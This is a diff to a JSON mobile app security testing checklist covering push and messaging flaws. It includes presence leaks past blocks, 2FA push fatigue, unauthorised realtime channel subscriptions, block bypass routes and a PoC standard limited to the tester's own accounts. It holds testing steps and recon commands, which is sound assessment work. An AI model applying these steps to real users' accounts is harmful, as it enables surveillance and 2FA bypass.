+   "test": "Block A from B; poll B's presence, typing and read state from A's session (REST and the\nrealtime channel). Then do the same from a third account that has no relationship with B. Privacy\nsettings (\"last seen: nobody\") are tested the same way: the API answers or it does not.",
+   "how": "Capture the presence/typing/receipt calls or subscriptions; replay or re-subscribe as A after\nthe block and as the stranger; poll over ten minutes while B is active and idle; diff.",
+   "proof": "B's activity signal returned to a session B blocked or never met, against B's stated privacy\nsetting.",
+   "escalation": "→ D24-048 when the leak is a realtime channel anyone can subscribe to; → D24-049 for\nthe block-bypass class.",
+   "ruled_out_when": "The blocked and stranger sessions receive the same static answer as for a\nnon-existent user (diff empty over the window), and the privacy setting changes the API answer."
+  },
+  {
+   "id": "D24-046",
+   "domain": "D24",
+   "title": "Inbound rich payload parsers — stickers, vCards, location pins, voice notes, polls handed to native or third-party decoders",
+   "severity": "support",
+   "severity_floor": "support",
+   "severity_note": "Support standalone; High / Critical through D16",
+   "vrt": "rated on the D16 sink reached — `application_level_denial_of_service_dos.critical_impact_and_or_easy_difficulty` (P2) only for a persistent, remotely triggered crash",
+   "vrt_priority": "P2",
+   "vrt_best": "P2",
+   "attacker": "AM-05 / AM-01 — a received object",
+   "attacker_ids": [
+    "AM-01",
+    "AM-05"
+   ],
+   "applies_to": "Messaging features that decode received objects with native code or bundled parsers (animated stickers, contact cards, map tiles, audio codecs, custom binary formats)",
+   "requires": "native, device",
+   "requires_tags": [
+    "native",
+    "device"
+   ],
+   "maps_to": "MASWE-0044; MASWE-0050; D16-036 (0-click paths), D16-024 (size arithmetic), D24-015 (push media as the trigger)",
+   "record": "`logs/D24-046.txt` (the entry-point table: object type → decoder → tap needed?)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [
+     "MASWE-0044",
+     "MASWE-0050"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": [
+     "application_level_denial_of_service_dos.critical_impact_and_or_easy_difficulty"
+    ]
+   },
+   "xrefs": [
+    "D16-024",
+    "D16-036",
+    "D24-015",
+    "D25-036"
+   ],
+   "domain_refs": [
+    "D16",
+    "D25"
+   ],
+   "has_code": true,
+   "skip_when": "`ls \"$DEC/apktool/lib/\"*/ 2>/dev/null | wc -l` = 0 and every received object type is decoded by platform code (table complete) — write `n/a — D24-046: no app-bundled decoder for received objects`.",
+   "test": "For every received object type, name the decoder, whether it runs on receipt or on tap, and\nwhether it is the platform's or the app's. The table is the deliverable; a found crash goes to D16\nwith the entry point attached. The zero-click column (decoded on receipt for the preview or the\nnotification) is the one that changes the multiplier.",
+   "how": "```bash\ngrep -rnE 'System\\.loadLibrary\\(|Lottie|rlottie|vcard|VCard|opus|ogg|webp|gif|tgs|LottieAnimationView' \"$DEC/jadx/sources\" | head\nls \"$DEC/apktool/lib/\"*/ | sort -u                                   # which decoders ship as .so\n# for each object type: send one well-formed object from B, trace which library decodes it and when (frida-trace -D \"$SERIAL\" -n \"$PKG\" -i 'decode*' or the app's JNI entry)\n```",
+   "proof": "The entry-point table with the decoder and the trigger context per object type; a crash or\nfault from a malformed object filed under D16 with the input hash.",
+   "escalation": "→ D16-036 and the D16 bug classes; → D25-036 when the decoder is a vendor library.",
+   "ruled_out_when": "Every received object type is decoded by platform code only (table complete with\nno app-bundled decoder), or app decoders run only on tap with the bounded fuzz recorded (count printed)."
+  },
+  {
+   "id": "D24-047",
+   "domain": "D24",
+   "title": "Approval-push (tap-to-approve 2FA) without number matching, with unlimited resends, approvable from the lock screen",
+   "severity": "critical",
+   "severity_floor": "high",
+   "severity_note": "High; Critical when the approval completes a login or a transfer from a locked device",
+   "vrt": "`broken_authentication_and_session_management.two_fa_bypass` (P3); `insufficient_security_configurability.weak_two_fa_implementation.missing_failsafe` (P5) is where a report without the demonstrated approval lands",
+   "vrt_priority": "P3",
+   "vrt_best": "P3",
+   "attacker": "AM-01 (push fatigue: the attacker holds the password and triggers prompts); AM-10 (approval from the keyguard)",
+   "attacker_ids": [
+    "AM-01",
+    "AM-10"
+   ],
+   "applies_to": "Apps that approve logins, payments or device enrolments from a notification action",
+   "requires": "push, two-accounts, device",
+   "requires_tags": [
+    "push",
+    "two-accounts",
+    "device"
+   ],
+   "maps_to": "MASWE-0023 (step-up authentication); MASWE-0037; D13-085 (owner of the lock-screen action), D13-066 (channel downgrade), D20-035 (`RemoteInput` on a sensitive notification)",
+   "record": "`logs/D24-047.txt` (resend count and timing; the keyguard trial); `screenshots/D24-047-1.png`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [
+     "MASWE-0023",
+     "MASWE-0037"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": [
+     "broken_authentication_and_session_management.two_fa_bypass",
+     "insufficient_security_configurability.weak_two_fa_implementation.missing_failsafe"
+    ]
+   },
+   "xrefs": [
+    "D08-040",
+    "D13-066",
+    "D13-085",
+    "D20-031",
+    "D20-035",
+    "D24-005"
+   ],
+   "domain_refs": [
+    "D08",
+    "D13",
+    "D20"
+   ],
+   "has_code": true,
+   "skip_when": "no login, payment or enrolment is approvable from a notification action (`grep -rlE 'addAction\\(' \"$DEC/jadx/sources\"` hits carry no approve/confirm semantics) — write `n/a — D24-047: no approval-push flow`.",
+   "test": "Three measurements. (a) Does the prompt show a number or code the user must match to the\nlogin screen, or is it a bare Approve button? (b) How many prompts can one password-holder trigger per\nminute, and is there a \"deny and lock\" path? (c) Can the Approve action be fired from the lock screen\n(D13-085) — by the holder of a locked phone, or by a listener via the action's `PendingIntent`\n(D08-040)?",
+   "how": "```bash\ngrep -rnE 'addAction\\(|setAllowGeneratedReplies|numberMatch|setAuthenticationRequired\\(' \"$DEC/jadx/sources\" | grep -iE 'approve|login|confirm|auth' | head\n# (b) with A's password from a second device, request login N=20 times in 2 minutes; count the prompts delivered (D24-005)\n# (c) lock A's device (KEYCODE_SLEEP), trigger a login, tap Approve from the keyguard; then the D20-031 listener firing actions[i].actionIntent\n```",
+   "proof": "A login or transfer completed by an approval that showed no matching code, after N\nunthrottled prompts, or from the keyguard / a listener's `send()`.",
+   "escalation": "→ `authentication_bypass` (P1) when the approval is the only second factor and the\npassword is the AM-01 precondition; → D13-085, D08-040, D20-035 for the acquisition halves.",
+   "ruled_out_when": "The prompt requires an in-app match code (screenshot), resends are throttled with a\nlockout (count and the 429), and the action carries `setAuthenticationRequired(true)` or opens the app\nbehind the keyguard (trial shows the unlock prompt)."
+  },
+  {
+   "id": "D24-048",
+   "domain": "D24",
+   "title": "Realtime pub/sub channel subscription not authorised server-side — WebSocket, MQTT or a third-party realtime SDK",
+   "severity": "critical",
+   "severity_floor": "high",
+   "severity_note": "Critical when the channel carries messages, OTPs or balances; High for presence and events",
+   "vrt": "`broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3); `broken_authentication_and_session_management.authentication_bypass` (P1) when a delivered value authenticates",
+   "vrt_priority": "P3",
+   "vrt_best": "P1",
+   "attacker": "AM-05 — any authenticated client; AM-01 when the channel auth endpoint takes no session",
+   "attacker_ids": [
+    "AM-01",
+    "AM-05"
+   ],
+   "applies_to": "Apps using a persistent realtime channel for chat, presence or live updates (WebSocket, MQTT, SSE, a hosted pub/sub SDK) whose channel names embed a user, room or order id. Per-message authorisation on the socket is D14-020; this item owns the subscribe step.",
+   "requires": "backend-api, two-accounts, mitm",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts",
+    "mitm"
+   ],
+   "maps_to": "CWE-862; CWE-639; D14-020, D15-056 (the push-topic twin)",
+   "record": "`logs/D24-048.txt` (channel names seen; the sibling subscription and what it delivered); `requests/E-NNN.http`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-639",
+     "CWE-862"
+    ],
+    "attack": [],
+    "vrt": [
+     "broken_access_control.idor.view_sensitive_information_iterable_object_identifiers",
+     "broken_authentication_and_session_management.authentication_bypass"
+    ]
+   },
+   "xrefs": [
+    "D14-020",
+    "D15-056",
+    "D24-045"
+   ],
+   "domain_refs": [
+    "D14",
+    "D15"
+   ],
+   "has_code": true,
+   "skip_when": "the proxy shows no persistent realtime channel (no WebSocket, MQTT or SSE connection, no pub/sub SDK in `$DEC`) — write `n/a — D24-048: no realtime channel`.",
+   "test": "The subscribe frame names the channel; the server either checks that the session may read it\nor it does not. Hosted pub/sub SDKs push this check into a \"channel auth\" endpoint the app calls — read\nthat endpoint's inputs (does the client name the channel, and does the server sign whatever it is\nasked?). Then subscribe to a sibling channel built from B's id and wait.",
+   "how": "```bash\ngrep -rnE 'subscribe\\(|private-|presence-|channel|topic|mqtt|wss?://' \"$DEC/jadx/sources\" | grep -viE 'firebase' | head -30\n# proxy / WebSocket view: capture the subscribe frame and the auth call as A; replay with B's channel name (user_<B>, room_<B's room>); keep the socket open while B acts\n```",
+   "proof": "B's canary content or events arriving on A's socket after the sibling subscription, with the\nframes.",
+   "escalation": "→ `authentication_bypass` when the channel carries an OTP or approval; → D14-020 for\nper-message checks on a channel the client legitimately holds; → D24-045 for the presence leak.",
+   "ruled_out_when": "The auth endpoint derives the channel from the session (your named channel is\nreplaced or refused — diff), and the sibling subscription receives nothing while B is active."
+  },
+  {
+   "id": "D24-049",
+   "domain": "D24",
+   "title": "Block, mute and privacy settings bypassable through an alternate route — reply, reaction, group, call or mention",
+   "severity": "high",
+   "severity_floor": "medium",
+   "severity_note": "Medium; High when the bypass delivers content to the victim's drawer",
+   "vrt": "`broken_access_control.privilege_escalation` (varies) — the product's own stated control is the boundary",
+   "vrt_priority": "varies",
+   "vrt_best": "varies",
+   "attacker": "AM-05 — the blocked user",
+   "attacker_ids": [
+    "AM-05"
+   ],
+   "applies_to": "Messaging features with block, mute, \"message requests\" or \"who can message me\" settings",
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "CWE-863; CWE-284; D24-045, D24-011",
+   "record": "`logs/D24-049.txt` (the route × setting table); `requests/E-NNN.http`; `screenshots/D24-049-1.png`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-284",
+     "CWE-863"
+    ],
+    "attack": [],
+    "vrt": [
+     "broken_access_control.privilege_escalation"
+    ]
+   },
+   "xrefs": [
+    "D24-005",
+    "D24-011",
+    "D24-045"
+   ],
+   "domain_refs": [],
+   "has_code": false,
+   "skip_when": "the product has no block, mute or message-request setting — write `n/a — D24-049: no block feature`.",
+   "test": "B blocks A. Enumerate every route by which A can still cause something to appear on B's\ndevice: reply in a shared group, react to B's message, mention B, forward a message to B, start a call,\ninvite B to a group, send a payment request, edit an old message in a shared thread. Each is a cell;\nthe ones that end in a push to B are the ones that pay.",
+   "how": "With the block in place, replay each route from A's session (counted, D24-005); watch B's\ndrawer and B's API responses.",
+   "proof": "Content from the blocked account rendered on B's device or returned in B's API, with the\nroute.",
+   "escalation": "→ D24-011 when the bypass route also carries free text; → D24-045 for presence.",
+   "ruled_out_when": "Every route returns a refusal consistent with the block (diff against an unblocked\nthird account) and B's drawer shows nothing during the sweep."
+  },
+  {
+   "id": "D24-050",
+   "domain": "D24",
+   "title": "The push and messaging graveyard — what is not a finding, with the policy sentence that says so",
+   "severity": "support",
+   "severity_floor": "support",
+   "severity_note": "Support",
+   "vrt": "`sensitive_data_exposure.disclosure_of_secrets.data_traffic_spam` (P5); `insufficient_security_configurability.lack_of_notification_email` (P5) — the two nodes a transport-only report lands on",
+   "vrt_priority": "P5",
+   "vrt_best": "P5",
+   "attacker": "AM-01",
+   "attacker_ids": [
+    "AM-01"
+   ],
+   "applies_to": "Every candidate in this chapter before D24-006 passes it",
+   "requires": "—",
+   "requires_tags": [
+    "—"
+   ],
+   "maps_to": "`docs/02-severity-and-reportability.md`; `docs/06-triage-playbook.md`; the Graveyard table of this chapter",
+   "record": "`logs/D24-050.txt` (one line per killed candidate quoting the policy or the taxonomy node)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": [
+     "insufficient_security_configurability.lack_of_notification_email",
+     "sensitive_data_exposure.disclosure_of_secrets.data_traffic_spam"
+    ]
+   },
+   "xrefs": [
+    "D24-006"
+   ],
+   "domain_refs": [],
+   "has_code": false,
+   "skip_when": "",
+   "test": "Carrier and RCS verified-sender spoofing is the carrier's bug; the push provider's visibility\nof payloads is its trust model; \"push is not end-to-end encrypted\" is the same; notification spam\nwithout an authorisation bypass and a one-off crash from a payload are both P5. Each gets a line in the\ndecision log quoting the node or the programme's exclusion text, so the next session does not re-walk\nit.",
+   "how": "For each killed candidate: `D24-NNN <candidate> KILLED — <node or quoted policy sentence> —\nwould become a finding if <the Graveyard column 3 condition>`.",
+   "proof": "The line exists; the candidate is in `report/assessment-status.md` under RULED OUT with the\nsame text.",
+   "escalation": "n/a — the column-3 condition is the escalation, item by item.",
+   "ruled_out_when": "Not applicable; a killed candidate without the quoted sentence is an opinion, not a\nruled-out entry."
+  },
+  {
+   "id": "D24-051",
+   "domain": "D24",
+   "title": "PoC standard for this chapter — own tokens, own accounts, the two-device recording, the victim's content redacted",
+   "severity": "support",
+   "severity_floor": "support",
+   "severity_note": "Support",
+   "vrt": "n/a — evidence standard",
+   "vrt_priority": "n/a",
+   "vrt_best": "n/a",
+   "attacker": "AM-01",
+   "attacker_ids": [
+    "AM-01"
+   ],
+   "applies_to": "Every finding filed from this chapter",
+   "requires": "—",
+   "requires_tags": [
+    "—"
+   ],
+   "maps_to": "`docs/04-poc-and-evidence-standard.md`; D27-031 (the canary rule); D20-002 (markers)",
+   "record": "`pocs/F-NNN/` (the recording, the request pair, the probe manifest where AM-03 applies); `logs/D24-051.txt` (the checklist below, ticked)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D20-002",
+    "D24-006",
+    "D24-010",
+    "D24-017",
+    "D24-036",
+    "D27-031"
+   ],
+   "domain_refs": [
+    "D20",
+    "D27"
+   ],
+   "has_code": false,
+   "skip_when": "",
+   "test": "A push or messaging PoC touches two principals by construction, so the standard is strict:\nsends go only to tokens, topics and accounts you own; never to a segment, \"all users\", a `condition`\nexpression or a third party's number; a leaked send credential is proved with one benign message to\nyour own device and then reported, not reused. The recording shows both devices in one take — the\nsender's request (or the attacker app's log) and the victim device's drawer or screen — with the canary\ntext visible and any real content redacted; the negative control (the same payload on the hardened\npath, or before the subscription) is in the same take.",
+   "how": "Checklist per finding: own-principals statement · canary text in the payload · both devices\nin frame (or the attacker-app log beside the victim screen) · the request or send in `requests/` ·\nthe negative control · the D24-006 severity line · the redaction pass.",
+   "proof": "`pocs/F-NNN/` contains the recording, the request pair and the ticked checklist.",
+   "escalation": "n/a — this is what lets D24-010, D24-017 and D24-036 be accepted at their ceiling.",
+   "ruled_out_when": "Not applicable; a finding without the own-principals statement is not filed."
+  },
+  {
+   "id": "D24-052",
+   "domain": "D24",
+   "title": "Chain-filing order — the push or messaging primitive first, then the consumer, with cross-references",
+   "severity": "support",
+   "severity_floor": "support",
+   "severity_note": "Support",
+   "vrt": "n/a — reporting discipline",
+   "vrt_priority": "n/a",
+   "vrt_best": "n/a",
+   "attacker": "AM-01",
+   "attacker_ids": [
+    "AM-01"
+   ],
+   "applies_to": "Every chain whose delivery clause is a push, a notification or a message",
+   "requires": "—",
+   "requires_tags": [
+    "—"
+   ],
+   "maps_to": "`docs/06-triage-playbook.md`; D27-016 (rate by acquisition path), D27-024 (the attack-scenario column)",
+   "record": "`logs/D24-052.txt` (the filing order and the report ids once assigned)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D24-006",
+    "D24-010",
+    "D24-011",
+    "D24-017",
+    "D24-019",
+    "D24-048",
+    "D27-016",
+    "D27-024"
+   ],
+   "domain_refs": [
+    "D09",
+    "D10",
+    "D13",
+    "D15",
+    "D27"
+   ],
+   "has_code": false,
+   "skip_when": "",
+   "test": "File the delivery primitive (D24-010 topic, D24-011 free-text route, D24-017 credential,\nD24-019 SDK component, D24-048 channel) as its own report with its own node, then file the consumer\n(D09 route, D10 WebView, D13 OTP, D15 IDOR) referencing it. One report that bundles both is rated on\nwhichever half the triager understands least; two reports with cross-references are rated on each.",
+   "how": "Write the primitive's report with the attack-scenario sentence ending at delivery; write the\nconsumer's report with \"delivery via <primitive report>\" as its precondition line; backfill the ids.",
+   "proof": "Two report drafts under `report/` with mutual references and the D24-006 line in each.",
+   "escalation": "n/a — this is the escalation mechanism for the chapter.",
+   "ruled_out_when": "Not applicable; a chain filed as one report is a rating choice the triager makes\nfor you."
+  }
+ ],
+ "phase": "P6",
+ "milestone": "M6"
+}
